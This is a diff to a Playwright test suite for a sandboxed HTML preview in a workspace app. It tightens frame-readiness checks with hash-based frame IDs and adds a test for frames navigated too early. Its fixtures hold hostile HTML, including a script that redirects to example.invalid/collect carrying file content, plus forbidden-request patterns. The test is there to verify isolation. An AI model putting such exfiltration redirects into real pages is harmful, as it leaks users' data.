@@ -198,11 +198,12 @@ const image = new Image(); image.src = "/healthz?hostile-image"; document.body.a
 const form = document.createElement("form"); form.method = "POST"; form.action = "/healthz?hostile-form"; document.body.append(form); form.submit();
 document.body.dataset.result = results.join(",");
 addEventListener("message", event => { if (event.data instanceof ArrayBuffer) parent.postMessage({kind:"html-repeat-received", length:event.data.byteLength}, "*"); });
-parent.postMessage({kind:"frame-ready"}, "*");
+parent.postMessage({kind:"frame-ready", frameId:location.hash.slice(1)}, "*");
 </script></body>`);
 fs.writeFileSync(path.join(folder, "navigation.html"), `<script>parent.postMessage({kind:"invented-navigation-script"}, "*"); location.href = "https://example.invalid/collect?data=invented-file-content"</script>`);
 fs.writeFileSync(path.join(folder, "stalled.html"), "<p>Invented stalled snapshot</p>");
 fs.writeFileSync(path.join(folder, "reopen.html"), "<p>Invented first HTML incarnation</p>");
+fs.writeFileSync(path.join(folder, "premature.html"), "<p>Invented private preview snapshot</p>");
 const observedFiles = ["photo.png", "report.pdf", "report.docx", "sample.xlsx", "large.svg", "notes.md"];
 const digest = (name: string) => createHash("sha256").update(fs.readFileSync(path.join(folder, name))).digest("hex");
 const originalDigests = new Map(observedFiles.map((name) => [name, digest(name)]));
@@ -544,7 +545,7 @@ try {
         const forbiddenRequests: string[] = [];
         context.on("requestfinished", request => { if (/hostile-(fetch|api|xhr|ws|image|form)/.test(request.url())) forbiddenRequests.push(request.url()); });
         await page.evaluate(() => { (window as any).htmlRepeatedBytes = 0; (window as any).htmlReplacementBytes = 0; (window as any).htmlReplacementReady = 0; window.addEventListener("message", (event) => { if (event.data?.kind === "html-repeat-received") (window as any).htmlRepeatedBytes = event.data.length; if (event.data?.kind === "html-replacement-received") (window as any).htmlReplacementBytes = event.data.length; if (event.data?.kind === "html-replacement-ready") (window as any).htmlReplacementReady++; }); });
-        await page.route("**/replacement-html-frame", (route) => route.fulfill({ status: 200, contentType: "text/html", body: `<body>Invented replacement<script>onmessage = event => { if (event.data instanceof ArrayBuffer) parent.postMessage({kind: "html-replacement-received", length: event.data.byteLength}, "*"); }; parent.postMessage({kind:"html-replacement-ready"}, "*"); parent.postMessage({kind:"frame-ready"}, "*"); setTimeout(() => parent.postMessage({kind:"frame-failed"}, "*"), 100);</script></body>` }));
+        await page.route("**/replacement-html-frame*", (route) => route.fulfill({ status: 200, contentType: "text/html", body: `<body>Invented replacement<script>onmessage = event => { if (event.data instanceof ArrayBuffer) parent.postMessage({kind: "html-replacement-received", length: event.data.byteLength}, "*"); }; parent.postMessage({kind:"html-replacement-ready"}, "*"); parent.postMessage({kind:"frame-ready", frameId:location.hash.slice(1)}, "*"); setTimeout(() => parent.postMessage({kind:"frame-failed"}, "*"), 100);</script></body>` }));
         let releaseHtmlShell!: () => void, startHtmlShell!: () => void;
         const htmlShellReleased = new Promise<void>((resolve) => { releaseHtmlShell = resolve; });
         const htmlShellStarted = new Promise<void>((resolve) => { startHtmlShell = resolve; });
@@ -559,7 +560,7 @@ try {
         await treeFile("hostile.html").click();
         try {
             await htmlShellStarted;
-            await page.evaluate(() => { const frame = document.createElement("iframe"); frame.id = "t20-foreign-html"; frame.sandbox.add("allow-scripts"); frame.src = "/replacement-html-frame"; document.body.append(frame); });
+            await page.evaluate(() => { const current = document.querySelector<HTMLIFrameElement>('iframe[title="hostile.html"]')!; const frame = document.createElement("iframe"); frame.id = "t20-foreign-html"; frame.sandbox.add("allow-scripts"); frame.src = `/replacement-html-frame${new URL(current.src).hash}`; document.body.append(frame); });
             await page.frameLocator("#t20-foreign-html").getByText("Invented replacement").waitFor();
             await waitUntil(() => page.evaluate(() => (window as any).htmlReplacementReady === 1), "the foreign frame sent readiness");
             await page.waitForTimeout(300);
@@ -580,13 +581,36 @@ try {
         await direct.waitForTimeout(300);
         assert(await page.evaluate(() => (window as any).htmlRepeatedBytes) === 0, "repeated HTML frame readiness cannot receive a second snapshot");
         assert(forbiddenRequests.length === 0 && !/hostile-(fetch|api|xhr|ws|image|form)/.test(serverOutput.join("")), "HTML cannot send API, connect, image or form requests");
-        await htmlFrame.evaluate((frame) => { (frame as HTMLIFrameElement).src = "/replacement-html-frame"; });
+        await htmlFrame.evaluate((frame) => { const iframe = frame as HTMLIFrameElement; iframe.src = `/replacement-html-frame${new URL(iframe.src).hash}`; });
         await page.frameLocator(".workspace-preview-html iframe").getByText("Invented replacement").waitFor();
         await waitUntil(() => page.evaluate(() => (window as any).htmlReplacementReady === 2), "the navigated frame sent readiness");
         await page.waitForTimeout(300);
         assert(await page.evaluate(() => (window as any).htmlReplacementBytes) === 0, "a navigated HTML frame cannot receive the retained snapshot again");
         assert(await htmlFrame.count() === 1, "a navigated frame cannot invalidate a completed HTML render");
-        await page.unroute("**/replacement-html-frame");
+        let releasePrematureShell!: () => void, startPrematureShell!: () => void;
+        const prematureShellReleased = new Promise<void>((resolve) => { releasePrematureShell = resolve; });
+        const prematureShellStarted = new Promise<void>((resolve) => { startPrematureShell = resolve; });
+        await page.route("**/workspace-preview?*", async (route) => {
+            const url = new URL(route.request().url());
+            if (url.searchParams.get("path") !== "premature.html" || url.searchParams.get("frame") !== "1") return route.continue();
+            const response = await route.fetch();
+            startPrematureShell();
+            await prematureShellReleased;
+            await route.fulfill({ response }).catch(() => {});
+        });
+        await treeFile("premature.html").click();
+        try {
+            await prematureShellStarted;
+            const prematureFrame = page.locator('.workspace-preview-html iframe[title="premature.html"]');
+            await prematureFrame.evaluate((frame) => { const iframe = frame as HTMLIFrameElement; iframe.src = `/replacement-html-frame${new URL(iframe.src).hash}`; });
+            await page.frameLocator('.workspace-preview-html iframe[title="premature.html"]').getByText("Invented replacement").waitFor();
+            await waitUntil(() => page.evaluate(() => (window as any).htmlReplacementReady === 3), "the prematurely navigated frame sent readiness");
+            await page.waitForTimeout(300);
+            assert(await page.evaluate(() => (window as any).htmlReplacementBytes) === 0, "a frame navigated before its first readiness cannot receive the HTML snapshot");
+        } finally { releasePrematureShell(); }
+        await tab("premature.html").locator(".workspace-tab-close").click();
+        await page.unroute("**/workspace-preview?*");
+        await page.unroute("**/replacement-html-frame*");
         let navigation = "";
         const navigationConsole: string[] = [];
         page.on("console", (message) => { if (message.text().includes("Content Security Policy")) navigationConsole.push(message.text()); });
@@ -613,7 +637,7 @@ try {
             let delivered = false;
             (window as any).controlledDeliveries = 0;
             window.addEventListener("message", (event) => {
-                if (delivered || event.source !== iframe.contentWindow || event.data?.kind !== "frame-ready") return;
+                if (delivered || event.source !== iframe.contentWindow || event.data?.kind !== "frame-ready" || event.data.frameId !== new URL(frameUrl).hash.slice(1)) return;
                 delivered = true;
                 (window as any).controlledDeliveries++;
                 const copy = new TextEncoder().encode(body.html).buffer;
